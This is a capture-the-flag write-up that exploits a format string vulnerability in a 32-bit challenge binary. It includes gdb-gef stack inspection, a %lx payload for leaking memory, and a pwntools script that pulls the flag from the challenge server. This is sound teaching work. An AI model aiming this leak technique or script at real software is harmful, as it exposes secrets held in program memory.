Let's get started with FORMAT:

First lets run the program:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/format]
└─$ ./format                                                                                                                                                                      
You can't win, but there are alternatives to fighting. -Obi Wan Kenobi
So what are you going to do?
asd
This is your input (in case you already forgot)!
asd
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/format]
└─$ ./format
You can't win, but there are alternatives to fighting. -Obi Wan Kenobi
So what are you going to do?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
This is your input (in case you already forgot)!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/format]
└─$ ./format
You can't win, but there are alternatives to fighting. -Obi Wan Kenobi
So what are you going to do?
ABCD.%lx.%lx.%lx.%lx
This is your input (in case you already forgot)!
ABCD.18.1.580385b0.ffa2bdf4

'''
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
So after running it twice we see that there is input from the user and then our input gets printed to the screen... I tested using a format specifier %lx (long hex) and we 
see that we are able to leak addresses from the stack. I sent 'ABCD' as an easily recognizeable string so that we can see if we can leak stack addresses and find our input location.

But before we get ahead of ourselves, lets do a few quick checks.

Using file & checksec.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/format]
└─$ file format 
format: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=370c1a2c7234347f8a602c5ad902b192f91314cc, for GNU/Linux 3.2.0, with debug_info, not stripped
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Hacking/cwe_screener_3.0/pwn/format]
└─$ checksec format 
[*] '/home/kali/Hacking/cwe_screener_3.0/pwn/format/format'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled


'''
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Here we see that there is almost every protection on this executeable, but thats okay, we probably aren't trying to smash the stack with this one.

If we use some static analysis... I prefer using ghidra with this binary, it gives us a better disassembler view than cutter.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
main()


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
It looks like main() makes two puts() calls before scanf() for our input, then opens and reads in flag.txt, closes the file, and then prints out our input back to the screen.

As stated before, we can use a format specifier for the printf() fuction in order to leak out addresses on the stack because our input will be printed out as parameters to the printf() function. All we need to do is find the location of our input relative to where the flag is saved on the stack.

We can see that our input is saved into local_88, and the flag is saved into local_a0. Both are indeed on the stack.

We can confirm with gdb-gef:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
gef➤  disass main
Dump of assembler code for function main:
...
   0x0000135f <+326>:   call   0x1070 <puts@plt>
   0x00001364 <+331>:   add    esp,0x10
   0x00001367 <+334>:   sub    esp,0xc
   0x0000136a <+337>:   lea    eax,[ebp-0x80]
   0x0000136d <+340>:   push   eax
   0x0000136e <+341>:   call   0x1030 <printf@plt>
   0x00001373 <+346>:   add    esp,0x10
   0x00001376 <+349>:   sub    esp,0xc
   0x00001379 <+352>:   push   0xa
   0x0000137b <+354>:   call   0x10b0 <putchar@plt>
   0x00001380 <+359>:   add    esp,0x10
   0x00001383 <+362>:   mov    eax,0x0
   0x00001388 <+367>:   mov    edx,DWORD PTR [ebp-0x1c]
   0x0000138b <+370>:   sub    edx,DWORD PTR gs:0x14
   0x00001392 <+377>:   je     0x1399 <main+384>
...                                                                                                       
gef➤  b*main+346
Breakpoint 2 at 0x56556373: file format.c, line 44.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Note that I saved a local flag.txt with the flag set to flag{AAAAAAAAAAAAAAAAAAAAAAAAAAA}. we can use the search-pattern function to find it.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
gef➤  run
Starting program: /home/kali/Hacking/cwe_screener_3.0/pwn/format/format 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
You can't win, but there are alternatives to fighting. -Obi Wan Kenobi
So what are you going to do?
1999  
This is your input (in case you already forgot)!
1999
Breakpoint 2, 0x56556373 in main (argc=0x1, argv=0xffffd054) at format.c:44
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x4       
$ebx   : 0x56559000  →  <_GLOBAL_OFFSET_TABLE_+0> or BYTE PTR [eax], dh
$ecx   : 0xffffce7c  →  0xe57cc800
$edx   : 0x1       
$esp   : 0xffffcec0  →  0xffffcf08  →  "1999"
$ebp   : 0xffffcf88  →  0x00000000
$esi   : 0x565563b0  →  <__libc_csu_init+0> push ebp
$edi   : 0xffffcf6c  →  0xe57cc800
$eip   : 0x56556373  →  <main+346> add esp, 0x10
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcec0│+0x0000: 0xffffcf08  →  "1999"        ← $esp
0xffffcec4│+0x0004: 0x00000018
0xffffcec8│+0x0008: 0x00000001
0xffffcecc│+0x000c: 0x5655a5b0  →  0x0005655a
0xffffced0│+0x0010: 0xffffcf44  →  0x00000000
0xffffced4│+0x0014: 0xf7fd427e  →   add esp, 0x30
0xffffced8│+0x0018: 0xf7c09a30  →  0x00006172 ("ra"?)
0xffffcedc│+0x001c: 0xffffd054  →  0xffffd22b  →  "/home/kali/Hacking/cwe_screener_3.0/pwn/format/for[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x5655636a <main+337>       lea    eax, [ebp-0x80]
   0x5655636d <main+340>       push   eax
   0x5655636e <main+341>       call   0x56556030 <printf@plt>
 → 0x56556373 <main+346>       add    esp, 0x10
   0x56556376 <main+349>       sub    esp, 0xc
   0x56556379 <main+352>       push   0xa
   0x5655637b <main+354>       call   0x565560b0 <putchar@plt>
   0x56556380 <main+359>       add    esp, 0x10
   0x56556383 <main+362>       mov    eax, 0x0
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "format", stopped 0x56556373 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56556373 → main(argc=0x1, argv=0xffffd054)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 1999
...
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffcdfc - 0xffffce00  →   "1999[...]" 
  0xffffcf08 - 0xffffcf0c  →   "1999" 
gef➤  search-pattern flag{
[+] Searching 'flag{' in memory
[+] In '[heap]'(0x5655a000-0x5657b000), permission=rw-
  0x5655a6f0 - 0x5655a708  →   "flag{AAAAAAAAAAAAAAAAAA}" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffcef0 - 0xffffcf0c  →   "flag{AAAAAAAAAAAAAAAAAA}1999" 

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
So we can see that our flag is on the stack and that it saved right next to our input.

We have up to 0x18 bytes to work with on our input, and I intend to use all of them... Our payload of numerous ".%lx" chained together will allow us to increment the value in which
is getting printed from the stack. So sending our payload in gdb...
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
gef➤  r
Starting program: /home/kali/Hacking/cwe_screener_3.0/pwn/format/format 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
You can't win, but there are alternatives to fighting. -Obi Wan Kenobi
So what are you going to do?
ABCD.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx
This is your input (in case you already forgot)!
ABCD.18.1.5655a5b0.ffffcf44.f7fd427e.f7c09a30.ffffd054.f7ffdb9c.2.f7fc2ae0.5655a5b0.67616c66.4141417b.41414141.41414141.41414141.7d414141
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
We can see that at locations 12 - 17 we are leaking the flag, so adjusting our payload accordingly so we dont have all the mess, we can increment the pointer on the stack manually:

%12$lx.%13$lx.%14$lx.%15$lx.%16$lx.%17$lx

The above string will allow us to print only the specific places in memory that we want.

This shows that our input "ABCD" is right next our flag (all the 41's) just note that they are in little endian so we will just need to flip them.

This is enough for us to generate our exploit:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
'''
format: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=370c1a2c7234347f8a602c5ad902b192f91314cc, for GNU/Linux 3.2.0, with debug_info, not stripped

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

'''
from pwn import *

context.binary = binary = ELF("./format")

# p = process()
p = remote("www.cweaccessionsctf.com", 1310)

# pid = util.proc.pidof(p)[0]
# print(f"Pid is: {pid}")
# util.proc.wait_for_debugger(pid)

# I used ghidra to understand that it read 0x18 bytes from the flag.txt file, which would be the flag itself
# by setting our flag locally to flag{AAAAAAAAAAAAAAAAAA}

# We can send the payload of:
# ABCD.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx

# To then find where the flag is! 
# Located at postions: 12 - 17
p.sendline(b"%12$lx.%13$lx.%14$lx.%15$lx.%16$lx.%17$lx")
# locally we recieved: 4141417b.41414141.41414141.41414141.7d414141 --which is our flag!

# remotely we recieved: 67616c66.6572477b.5f6f6465.746f6873.7269665f.a7d7473

# flag{Greedo_shot_first}

p.interactive()
